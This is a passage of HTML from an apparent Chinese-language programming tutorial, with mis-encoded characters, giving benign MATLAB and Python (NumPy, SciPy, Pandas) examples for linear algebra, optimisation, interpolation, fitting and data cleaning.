çš„è§£</strong></h4><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs prolog"><span class="hljs-symbol">A</span> = [<span class="hljs-number">2</span>, <span class="hljs-number">-1</span>; <span class="hljs-number">-4</span>, <span class="hljs-number">3</span>];  <span class="hljs-comment">% ç³»æ•°çŸ©é˜µ</span><br>b = [<span class="hljs-number">1</span>; <span class="hljs-number">-2</span>];         <span class="hljs-comment">% å¸¸æ•°é¡¹</span><br><br>x = <span class="hljs-symbol">A</span>\b;             <span class="hljs-comment">% è§£çº¿æ€§æ–¹ç¨‹ç»„</span><br></code></pre></td></tr></table></figure><hr><h3 id="3-2-ä¼˜åŒ–é—®é¢˜"><a href="#3-2-ä¼˜åŒ–é—®é¢˜" class="headerlink" title="3.2 ä¼˜åŒ–é—®é¢˜"></a><strong>3.2 ä¼˜åŒ–é—®é¢˜</strong></h3><p>MATLAB çš„ä¼˜åŒ–å·¥å…·ç®±å¯ä»¥æ±‚è§£å„ç§ä¼˜åŒ–é—®é¢˜ã€‚</p><h4 id="å®ä¾‹-8ï¼šæœ€å°åŒ–å‡½æ•°"><a href="#å®ä¾‹-8ï¼šæœ€å°åŒ–å‡½æ•°" class="headerlink" title="å®ä¾‹ 8ï¼šæœ€å°åŒ–å‡½æ•°"></a><strong>å®ä¾‹ 8ï¼šæœ€å°åŒ–å‡½æ•°</strong></h4><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs matlab"><span class="hljs-comment">% å®šä¹‰ç›®æ ‡å‡½æ•°</span><br>f = @(x) (x - <span class="hljs-number">3</span>)^<span class="hljs-number">2</span> + <span class="hljs-built_in">sin</span>(x);<br><br><span class="hljs-comment">% ä½¿ç”¨ fminbnd æ±‚è§£</span><br>x_min = fminbnd(f, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>);  <span class="hljs-comment">% åœ¨ [0, 5] åŒºé—´å†…æœ€å°åŒ–å‡½æ•° f</span><br><span class="hljs-built_in">disp</span>([<span class="hljs-string">&#x27;æœ€å°å€¼å‡ºç°åœ¨ x = &#x27;</span>, num2str(x_min)]);<br></code></pre></td></tr></table></figure><hr><h2 id="å››ã€ç¬¦å·è¿ç®—"><a href="#å››ã€ç¬¦å·è¿ç®—" class="headerlink" title="å››ã€ç¬¦å·è¿ç®—"></a><strong>å››ã€ç¬¦å·è¿ç®—</strong></h2><p>MATLAB æä¾›ç¬¦å·è¿ç®—å·¥å…·ï¼Œå¯ä»¥è¿›è¡Œç¬¦å·å¾®ç§¯åˆ†ã€æ–¹ç¨‹æ±‚è§£ç­‰ã€‚</p><h4 id="å®ä¾‹-9ï¼šç¬¦å·å¾®ç§¯åˆ†"><a href="#å®ä¾‹-9ï¼šç¬¦å·å¾®ç§¯åˆ†" class="headerlink" title="å®ä¾‹ 9ï¼šç¬¦å·å¾®ç§¯åˆ†"></a><strong>å®ä¾‹ 9ï¼šç¬¦å·å¾®ç§¯åˆ†</strong></h4><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs llvm">syms <span class="hljs-keyword">x</span><span class="hljs-comment">;</span><br><span class="hljs-comment"></span><br>% æ±‚å¯¼<br>f <span class="hljs-operator">=</span> <span class="hljs-keyword">x</span>^<span class="hljs-number">2</span> * sin(<span class="hljs-keyword">x</span>)<span class="hljs-comment">;</span><br>df <span class="hljs-operator">=</span> diff(f)<span class="hljs-comment">;  % å¯¹ f æ±‚å¯¼</span><br><br>% ç§¯åˆ†<br>int_f <span class="hljs-operator">=</span> int(f)<span class="hljs-comment">;  % å¯¹ f æ±‚ä¸å®šç§¯åˆ†</span><br></code></pre></td></tr></table></figure><hr><h2 id="äº”ã€æœºå™¨å­¦ä¹ ä¸æ•°æ®å»ºæ¨¡"><a href="#äº”ã€æœºå™¨å­¦ä¹ ä¸æ•°æ®å»ºæ¨¡" class="headerlink" title="äº”ã€æœºå™¨å­¦ä¹ ä¸æ•°æ®å»ºæ¨¡"></a><strong>äº”ã€æœºå™¨å­¦ä¹ ä¸æ•°æ®å»ºæ¨¡</strong></h2><h3 id="5-1-æ•°æ®æ‹Ÿåˆ"><a href="#5-1-æ•°æ®æ‹Ÿåˆ" class="headerlink" title="5.1 æ•°æ®æ‹Ÿåˆ"></a><strong>5.1 æ•°æ®æ‹Ÿåˆ</strong></h3><p>MATLAB æä¾› <code>polyfit</code> å‡½æ•°ç”¨äºå¤šé¡¹å¼æ‹Ÿåˆã€‚</p><h4 id="å®ä¾‹-10ï¼šçº¿æ€§æ‹Ÿåˆ"><a href="#å®ä¾‹-10ï¼šçº¿æ€§æ‹Ÿåˆ" class="headerlink" title="å®ä¾‹ 10ï¼šçº¿æ€§æ‹Ÿåˆ"></a><strong>å®ä¾‹ 10ï¼šçº¿æ€§æ‹Ÿåˆ</strong></h4><figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs gml"><span class="hljs-variable language_">x</span> = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>];   % è‡ªå˜é‡<br><span class="hljs-variable language_">y</span> = [<span class="hljs-number">2.2</span>, <span class="hljs-number">2.8</span>, <span class="hljs-number">3.6</span>, <span class="hljs-number">4.5</span>, <span class="hljs-number">5.1</span>];  % å› å˜é‡<br><br>% æ‹Ÿåˆä¸€é˜¶å¤šé¡¹å¼ï¼ˆç›´çº¿ï¼‰<br>p = polyfit(<span class="hljs-variable language_">x</span>, <span class="hljs-variable language_">y</span>, <span class="hljs-number">1</span>);<br><br>% ç»˜åˆ¶æ‹Ÿåˆç»“æœ<br>y_fit = polyval(p, <span class="hljs-variable language_">x</span>);<br>plot(<span class="hljs-variable language_">x</span>, <span class="hljs-variable language_">y</span>, <span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-variable language_">x</span>, y_fit, <span class="hljs-string">&#x27;-&#x27;</span>);  % åŸå§‹æ•°æ®å’Œæ‹Ÿåˆæ›²çº¿<br>legend(<span class="hljs-string">&#x27;æ•°æ®ç‚¹&#x27;</span>, <span class="hljs-string">&#x27;æ‹Ÿåˆçº¿&#x27;</span>);<br></code></pre></td></tr></table></figure><hr><h2 id="å…­ã€å¹¶è¡Œè®¡ç®—ä¸æ€§èƒ½ä¼˜åŒ–"><a href="#å…­ã€å¹¶è¡Œè®¡ç®—ä¸æ€§èƒ½ä¼˜åŒ–" class="headerlink" title="å…­ã€å¹¶è¡Œè®¡ç®—ä¸æ€§èƒ½ä¼˜åŒ–"></a><strong>å…­ã€å¹¶è¡Œè®¡ç®—ä¸æ€§èƒ½ä¼˜åŒ–</strong></h2><p>MATLAB æ”¯æŒå¤šçº¿ç¨‹å’Œå¹¶è¡Œè®¡ç®—ï¼Œå¯ä»¥åŠ é€Ÿè®¡ç®—ã€‚</p><h4 id="å®ä¾‹-11ï¼šå¹¶è¡Œ-for-å¾ªç¯"><a href="#å®ä¾‹-11ï¼šå¹¶è¡Œ-for-å¾ªç¯" class="headerlink" title="å®ä¾‹ 11ï¼šå¹¶è¡Œ for å¾ªç¯"></a><strong>å®ä¾‹ 11ï¼šå¹¶è¡Œ for å¾ªç¯</strong></h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">parfor i</span> = 1:10<br>    disp([<span class="hljs-string">&#x27;è®¡ç®—ä¸­: &#x27;</span>, num2str(i)]);<br><span class="hljs-attribute">end</span><br></code></pre></td></tr></table></figure><hr><h1 id="python"><a href="#python" class="headerlink" title="python"></a>python</h1><h2 id="1-NumPyï¼šæ•°å€¼è®¡ç®—åŸºç¡€åº“"><a href="#1-NumPyï¼šæ•°å€¼è®¡ç®—åŸºç¡€åº“" class="headerlink" title="1. NumPyï¼šæ•°å€¼è®¡ç®—åŸºç¡€åº“"></a><strong>1. NumPyï¼šæ•°å€¼è®¡ç®—åŸºç¡€åº“</strong></h2><h3 id="1-1-åˆ›å»ºå¤šç»´æ•°ç»„"><a href="#1-1-åˆ›å»ºå¤šç»´æ•°ç»„" class="headerlink" title="1.1 åˆ›å»ºå¤šç»´æ•°ç»„"></a><strong>1.1 åˆ›å»ºå¤šç»´æ•°ç»„</strong></h3><p>åœ¨å®é™…åº”ç”¨ä¸­ï¼Œ<strong>NumPy</strong> ç»å¸¸ç”¨äºåˆ›å»ºçŸ©é˜µæˆ–å¤šç»´æ•°ç»„è¿›è¡Œæ•°å­¦è®¡ç®—ã€‚ä»¥ä¸‹æ˜¯å¦‚ä½•åˆ›å»ºé«˜ç»´æ•°ç»„å¹¶è¿›è¡Œæ“ä½œçš„ç¤ºä¾‹ï¼š</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import numpy as np<br><br><span class="hljs-comment"># åˆ›å»º 3x3 çš„éšæœºçŸ©é˜µ</span><br>A = np.random.rand(3, 3)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;A:\n&quot;</span>, A)<br><br><span class="hljs-comment"># åˆ›å»º 3x3 çš„å•ä½çŸ©é˜µ</span><br>I = np.eye(3)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;å•ä½çŸ©é˜µ I:\n&quot;</span>, I)<br><br><span class="hljs-comment"># è®¡ç®—çŸ©é˜µ A ä¸å•ä½çŸ©é˜µ I çš„åŠ æ³•</span><br>result = A + I<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;A + I:\n&quot;</span>, result)<br><br><span class="hljs-comment"># è®¡ç®— A çš„é€†çŸ©é˜µ</span><br>A_inv = np.linalg.inv(A)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;A çš„é€†çŸ©é˜µï¼š\n&quot;</span>, A_inv)<br></code></pre></td></tr></table></figure><h3 id="1-2-å¹¿æ’­æœºåˆ¶ä¸æ•°ç»„è¿ç®—"><a href="#1-2-å¹¿æ’­æœºåˆ¶ä¸æ•°ç»„è¿ç®—" class="headerlink" title="1.2 å¹¿æ’­æœºåˆ¶ä¸æ•°ç»„è¿ç®—"></a><strong>1.2 å¹¿æ’­æœºåˆ¶ä¸æ•°ç»„è¿ç®—</strong></h3><p>åœ¨æ•°æ®åˆ†æä¸­ï¼Œæˆ‘ä»¬ç»å¸¸éœ€è¦å¯¹æ•°ç»„è¿›è¡Œé€å…ƒç´ æ“ä½œï¼Œ<strong>NumPy</strong> çš„å¹¿æ’­æœºåˆ¶ä½¿å¾—è¿™ä¸€è¿‡ç¨‹æ›´åŠ é«˜æ•ˆã€‚</p><h4 id="å®ä¾‹ï¼šåŠ æƒå¹³å‡"><a href="#å®ä¾‹ï¼šåŠ æƒå¹³å‡" class="headerlink" title="å®ä¾‹ï¼šåŠ æƒå¹³å‡"></a><strong>å®ä¾‹ï¼šåŠ æƒå¹³å‡</strong></h4><p>å‡è®¾ä½ æœ‰ä¸€ä¸ªè¯„åˆ†æ•°ç»„å’Œä¸€ä¸ªå¯¹åº”çš„æƒé‡æ•°ç»„ï¼Œä½ å¯ä»¥ä½¿ç”¨å¹¿æ’­æœºåˆ¶æ¥è®¡ç®—åŠ æƒå¹³å‡ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># è¯„åˆ†æ•°ç»„å’Œæƒé‡æ•°ç»„</span><br><span class="hljs-attribute">scores</span> = np.array([<span class="hljs-number">80</span>, <span class="hljs-number">90</span>, <span class="hljs-number">70</span>, <span class="hljs-number">85</span>, <span class="hljs-number">95</span>])<br><span class="hljs-attribute">weights</span> = np.array([<span class="hljs-number">0</span>.<span class="hljs-number">1</span>, <span class="hljs-number">0</span>.<span class="hljs-number">2</span>, <span class="hljs-number">0</span>.<span class="hljs-number">3</span>, <span class="hljs-number">0</span>.<span class="hljs-number">2</span>, <span class="hljs-number">0</span>.<span class="hljs-number">2</span>])<br><br><span class="hljs-comment"># ä½¿ç”¨å¹¿æ’­æœºåˆ¶è®¡ç®—åŠ æƒå¹³å‡</span><br><span class="hljs-attribute">weighted_average</span> = np.sum(scores * weights)<br><span class="hljs-attribute">print</span>(<span class="hljs-string">&quot;åŠ æƒå¹³å‡æˆç»©:&quot;</span>, weighted_average)<br></code></pre></td></tr></table></figure><hr><h2 id="2-SciPyï¼šç§‘å­¦è®¡ç®—åº“"><a href="#2-SciPyï¼šç§‘å­¦è®¡ç®—åº“" class="headerlink" title="2. SciPyï¼šç§‘å­¦è®¡ç®—åº“"></a><strong>2. SciPyï¼šç§‘å­¦è®¡ç®—åº“</strong></h2><h3 id="2-1-ä¼˜åŒ–ï¼šæœ€å°åŒ–é—®é¢˜"><a href="#2-1-ä¼˜åŒ–ï¼šæœ€å°åŒ–é—®é¢˜" class="headerlink" title="2.1 ä¼˜åŒ–ï¼šæœ€å°åŒ–é—®é¢˜"></a><strong>2.1 ä¼˜åŒ–ï¼šæœ€å°åŒ–é—®é¢˜</strong></h3><p>åœ¨å®é™…å·¥ç¨‹ä¸­ï¼Œå¸¸å¸¸éœ€è¦é€šè¿‡ä¼˜åŒ–ç®—æ³•æ¥æ‰¾åˆ°æœ€ä¼˜è§£ã€‚<strong>SciPy</strong> æä¾›äº†å¼ºå¤§çš„ä¼˜åŒ–å·¥å…·ã€‚ä»¥ä¸‹æ˜¯ä¸€ä¸ªæœ€å°åŒ–é—®é¢˜çš„ç¤ºä¾‹ã€‚</p><h4 id="å®ä¾‹ï¼šæœ€å°åŒ–æŸå¤±å‡½æ•°"><a href="#å®ä¾‹ï¼šæœ€å°åŒ–æŸå¤±å‡½æ•°" class="headerlink" title="å®ä¾‹ï¼šæœ€å°åŒ–æŸå¤±å‡½æ•°"></a><strong>å®ä¾‹ï¼šæœ€å°åŒ–æŸå¤±å‡½æ•°</strong></h4><p>å‡è®¾ä½ åœ¨åšå›å½’åˆ†æï¼Œéœ€è¦é€šè¿‡æœ€å°åŒ–å‡æ–¹è¯¯å·®æ¥æ‹Ÿåˆä¸€æ¡ç›´çº¿ã€‚</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> scipy import optimize<br><span class="hljs-attribute">import</span> numpy as np<br><br><span class="hljs-comment"># å®šä¹‰æŸå¤±å‡½æ•°ï¼šå‡æ–¹è¯¯å·® (MSE)</span><br><span class="hljs-attribute">def</span> loss(params, x, y):<br>    <span class="hljs-attribute">m</span>, b = params<br>    <span class="hljs-attribute">return</span> np.sum((y - (m * x + b))**<span class="hljs-number">2</span>)<br><br><span class="hljs-comment"># ç¤ºä¾‹æ•°æ®</span><br><span class="hljs-attribute">x_data</span> = np.array([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>])<br><span class="hljs-attribute">y_data</span> = np.array([<span class="hljs-number">2</span>.<span class="hljs-number">3</span>, <span class="hljs-number">2</span>.<span class="hljs-number">9</span>, <span class="hljs-number">3</span>.<span class="hljs-number">1</span>, <span class="hljs-number">3</span>.<span class="hljs-number">9</span>, <span class="hljs-number">4</span>.<span class="hljs-number">7</span>])<br><br><span class="hljs-comment"># ä½¿ç”¨ optimize.minimize å¯»æ‰¾æœ€ä¼˜çš„ m å’Œ b</span><br><span class="hljs-attribute">result</span> = optimize.minimize(loss,<span class="hljs-meta"> [1, 0], args=(x_data, y_data))</span><br><span class="hljs-meta">m_opt, b_opt = result.x</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">print(f&quot;æœ€ä¼˜å‚æ•°ï¼šm=&#123;m_opt&#125;, b=&#123;b_opt&#125;&quot;)</span><br></code></pre></td></tr></table></figure><h3 id="2-2-æ’å€¼ï¼šæ•°æ®è¡¥å…¨"><a href="#2-2-æ’å€¼ï¼šæ•°æ®è¡¥å…¨" class="headerlink" title="2.2 æ’å€¼ï¼šæ•°æ®è¡¥å…¨"></a><strong>2.2 æ’å€¼ï¼šæ•°æ®è¡¥å…¨</strong></h3><p>åœ¨å®é™…åº”ç”¨ä¸­ï¼Œæ•°æ®å¯èƒ½å­˜åœ¨ç¼ºå¤±ï¼Œ<strong>SciPy</strong> æä¾›äº†æ’å€¼å·¥å…·æ¥å¡«è¡¥ç¼ºå¤±æ•°æ®ã€‚</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> scipy import interpolate<br><br><span class="hljs-comment"># åŸå§‹æ•°æ®</span><br><span class="hljs-attribute">x</span> = np.array([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>])<br><span class="hljs-attribute">y</span> = np.array([<span class="hljs-number">2</span>.<span class="hljs-number">5</span>, <span class="hljs-number">3</span>.<span class="hljs-number">5</span>, np.nan, <span class="hljs-number">5</span>.<span class="hljs-number">5</span>, <span class="hljs-number">6</span>.<span class="hljs-number">5</span>])<br><br><span class="hljs-comment"># ä½¿ç”¨æ’å€¼æ–¹æ³•å¡«è¡¥ç¼ºå¤±å€¼</span><br><span class="hljs-attribute">f</span> = interpolate.interp1d(x[~np.isnan(y)], y[~np.isnan(y)], kind=&#x27;linear&#x27;, fill_value=&#x27;extrapolate&#x27;)<br><span class="hljs-attribute">y_filled</span> = f(x)<br><br><span class="hljs-attribute">print</span>(<span class="hljs-string">&quot;å¡«è¡¥åçš„æ•°æ®ï¼š&quot;</span>, y_filled)<br></code></pre></td></tr></table></figure><hr><h2 id="3-Pandasï¼šæ•°æ®å¤„ç†å’Œåˆ†æ"><a href="#3-Pandasï¼šæ•°æ®å¤„ç†å’Œåˆ†æ" class="headerlink" title="3. Pandasï¼šæ•°æ®å¤„ç†å’Œåˆ†æ"></a><strong>3. Pandasï¼šæ•°æ®å¤„ç†å’Œåˆ†æ</strong></h2><h3 id="3-1-æ•°æ®æ¸…ç†ä¸è½¬æ¢"><a href="#3-1-æ•°æ®æ¸…ç†ä¸è½¬æ¢" class="headerlink" title="3.1 æ•°æ®æ¸…ç†ä¸è½¬æ¢"></a><strong>3.1 æ•°æ®æ¸…ç†ä¸è½¬æ¢</strong></h3><p>åœ¨æ•°æ®é¢„å¤„ç†è¿‡ç¨‹ä¸­ï¼Œæ•°æ®æ¸…æ´—å’Œè½¬æ¢æ˜¯éå¸¸é‡è¦çš„æ­¥éª¤ã€‚ä½¿ç”¨ <strong>Pandas</strong> ä½ å¯ä»¥è½»æ¾å¤„ç†ç¼ºå¤±å€¼ã€é‡å¤æ•°æ®ç­‰é—®é¢˜ã€‚</p><h4 id="å®ä¾‹ï¼šå»é™¤ç¼ºå¤±å€¼å¹¶å¤„ç†é‡å¤æ•°æ®"><a href="#å®ä¾‹ï¼šå»é™¤ç¼ºå¤±å€¼å¹¶å¤„ç†é‡å¤æ•°æ®" class="headerlink" title="å®ä¾‹ï¼šå»é™¤ç¼ºå¤±å€¼å¹¶å¤„ç†é‡å¤æ•°æ®"></a><strong>å®ä¾‹ï¼šå»é™¤ç¼ºå¤±å€¼å¹¶å¤„ç†é‡å¤æ•°æ®</strong></h4><p>å‡è®¾ä½ æœ‰ä¸€ä¸ªåŒ…å«ç¼ºå¤±å€¼å’Œé‡å¤æ•°æ®çš„ DataFrameï¼Œä½ å¯ä»¥ä½¿ç”¨ Pandas æ¥æ¸…ç†æ•°æ®ã€‚</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd<br><br><span class="hljs-meta"># åˆ›å»ºå¸¦æœ‰ç¼ºå¤±å€¼å’Œé‡å¤æ•°æ®çš„ DataFrame</span><br><span class="hljs-class"><span class="hljs-keyword">data</span> = &#123;</span><br><span class="hljs-class">    &#x27;<span class="hljs-type">Name</span>&#x27;: [&#x27;<span class="hljs-type">Alice</span>&#x27;, &#x27;<span class="hljs-type">Bob</span>&#x27;, &#x27;<span class="hljs-type">Charlie</span>&#x27;, &#x27;<span class="hljs-type">Alice</span>&#x27;, <span class="hljs-type">None</span>],</span><br><span class="hljs-class">    &#x27;<span class="hljs-type">Age</span>&#x27;: [25, 30, <span class="hljs-type">None</span>, 25, 35],</span><br><span class="hljs-class">    &#x27;<span class="hljs-type">Score</span>&#x27;: [85, 90, 78, 85, <span class="hljs-type">None</span>]</span><br><span class="hljs-class">&#125;</span><br><span class="hljs-title">df</span> = pd.<span class="hljs-type">DataFrame</span>(<span class="hljs-class"><span class="hljs-keyword">data</span>)</span><br><br><span class="hljs-meta"># å»é™¤é‡å¤æ•°æ®</span><br><span class="hljs-title">df_cleaned</span> = df.drop_duplicates()<br><br><span class="hljs-meta"># åˆ é™¤åŒ…å«ç¼ºå¤±å€¼çš„è¡Œ</span><br><span class="hljs-title">df_cleaned</span> = df_cleaned.dropna()<br><br><span class="hljs-title">print</span>(<span class="hljs-string">&quot;æ¸…ç†åçš„æ•°æ®ï¼š\n&quot;</span>, df_cleaned)<br></code></pre></td></tr></table></figure><h3 id="3-2-æ•°æ®èšåˆä¸åˆ†ç»„"><a href="#3-2-æ•°æ®èšåˆä¸åˆ†ç»„" class="headerlink" title="3.2 æ•°æ®èšåˆä¸åˆ†ç»„"></a><strong>3.2 æ•°æ®èšåˆä¸åˆ†ç»„</strong></h3><p>Pandas æä¾›äº†å¼ºå¤§çš„åˆ†ç»„åŠŸèƒ½ï¼Œé€‚ç”¨äºå„ç§èšåˆä»»åŠ¡ã€‚</p><h4 id="å®ä¾‹ï¼šæŒ‰å¹´é¾„åˆ†ç»„å¹¶è®¡ç®—å¹³å‡åˆ†"><a href="#å®ä¾‹ï¼šæŒ‰å¹´é¾„åˆ†ç»„å¹¶è®¡ç®—å¹³å‡åˆ†" class="headerlink" title="å®ä¾‹ï¼šæŒ‰å¹´é¾„åˆ†ç»„å¹¶è®¡ç®—å¹³å‡åˆ†"></a><strong>å®ä¾‹ï¼šæŒ‰å¹´é¾„åˆ†ç»„å¹¶è®¡ç®—å¹³å‡åˆ†</strong></h4><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-meta"># åˆ›å»ºç¤ºä¾‹ DataFrame</span><br><span class="hljs-class"><span class="hljs-keyword">data</span> = &#123;</span><br><span class="hljs-class">    &#x27;<span class="hljs-type">Name</span>&#x27;: [&#x27;<span class="hljs-type">Alice</span>&#x27;, &#x27;<span class="hljs-type">Bob</span>&#x27;, &#x27;<span class="hljs-type">Charlie</span>&#x27;, &#x27;<span class="hljs-type">David</span>&#x27;, &#x27;<span class="hljs-type">Edward</span>&#x27;],</span><br><span class="hljs-class">    &#x27;<span class="hljs-type">Age</span>&#x27;: [25, 30, 25, 30, 25],</span><br><span class="hljs-class">    &#x27;<span class="hljs-type">Score</span>&#x27;: [85, 90, 78, 88, 92]</span><br><span class="hljs-class">&#125;</span><br><span class="hljs-title">df</span> = pd.<span class="hljs-type">DataFrame</span>(<span class="hljs-class"><span class="hljs-keyword">data</span>)</span><br><br><span class="hljs-meta"># æŒ‰å¹´é¾„åˆ†ç»„ï¼Œå¹¶è®¡ç®—æ¯ç»„çš„å¹³å‡åˆ†</span><br><span class="hljs-title">grouped</span> = df.groupby(&#x27;<span class="hljs-type">Age&#x27;</span>).mean()<br><br><span class="hljs-title">print</span>(<span class="hljs-string">&quot;æŒ‰å¹´é¾„åˆ†ç»„è®¡ç®—å¹³å‡åˆ†ï¼š\n&quot;</span>, grouped)<br></code></pre></td></tr></table></figure><h3 id="3-3-æ•°æ®é€è§†è¡¨"><a href="#3-3-æ•°æ®é€è§†è¡¨" class="headerlink" title="3.3 æ•°æ®é€è§†è¡¨"></a><strong>3.3 æ•°æ®é€è§†è¡¨</strong></h3><p>åœ¨å¤šç»´æ•°æ®åˆ†æä¸­ï¼Œä½¿ç”¨ <strong>Pandas</strong> çš„æ•°æ®é€è§†è¡¨ï¼ˆpivot_tableï¼‰å¯ä»¥å¿«é€Ÿè¿›è¡Œå¤æ‚çš„æ•°æ®åˆ†æã€‚</p><h4 id="å®ä¾‹ï¼šåˆ›å»ºæ•°æ®é€è§†è¡¨"><a href="#å®ä¾‹ï¼šåˆ›å»ºæ•°æ®é€è§†è¡¨" class="headerlink" title="å®ä¾‹ï¼šåˆ›å»ºæ•°æ®é€è§†è¡¨"></a><strong>å®ä¾‹ï¼šåˆ›å»ºæ•°æ®é€è§†è¡¨</strong></h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># åˆ›å»ºç¤ºä¾‹ DataFrame</span><br>data = &#123;<br>    <span class="hljs-string">&#x27;Name&#x27;</span>: [<span class="hljs-string">&#x27;Alice&#x27;</span>, <span class="hljs-string">&#x27;Bob&#x27;</span>, <span class="hljs-string">&#x27;Charlie&#x27;</span>, <span class="hljs-string">&#x27;David&#x27;</span>, <span class="hljs-string">&#x27;Edward&#x27;</span>],<br>    <span class="hljs-string">&#x27;Department&#x27;</span>: [<span class="hljs-string">&#x27;HR&#x27;</span>, <span class="hljs-string">&#x27;Engineering&#x27;</span>, <span class="hljs-string">&#x27;HR&#x27;</span>, <span class="hljs-string">&#x27;Engineering&#x27;</span>, <span class="hljs-string">&#x27;Marketing&#x27;</span>],<br>    <span class="hljs-string">&#x27;Salary&#x27;</span>: [50000, 60000, 55000, 70000, 45000],<br>    <span class="hljs-string">&#x27;Experience&#x27;</span>: [2, 5, 3, 6, 1]<br>&#125;<br>df = pd.DataFrame(data)<br><br><span class="hljs-comment"># åˆ›å»ºæ•°æ®é€è§†è¡¨ï¼šæŒ‰éƒ¨é—¨åˆ†ç»„ï¼Œè®¡ç®—è–ªèµ„å’Œç»éªŒçš„å¹³å‡å€¼</span><br>pivot_table = df.pivot_table(values=[<span class="hljs-string">&#x27;Salary&#x27;</span>, <span class="hljs-string">&#x27;Experience&#x27;</span>], <span class="hljs-attribute">index</span>=<span class="hljs-string">&#x27;Department&#x27;</span>, <span class="hljs-attribute">aggfunc</span>=<span class="hljs-string">&#x27;mean&#x27;</span>)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;æ•°æ®é€è§†è¡¨ï¼š\n&quot;</span>, pivot_table)<br></code></pre></td></tr></table></figure><hr><h2 id="4-Matplotlibï¼šæ•°æ®å¯è§†åŒ–"><a href="#4-Matplotlibï¼šæ•°æ®å¯è§†åŒ–" class="headerlink" title="4. Matplotlibï¼šæ•°æ®å¯è§†åŒ–"></a><strong>4. Matplotlibï¼šæ•°æ®å¯è§†åŒ–</strong></h2><h3 id="4-1-ç»˜åˆ¶å¤šä¸ªå­å›¾"><a href="#4-1-ç»˜åˆ¶å¤šä¸ªå­å›¾" class="headerlink" title="4.1 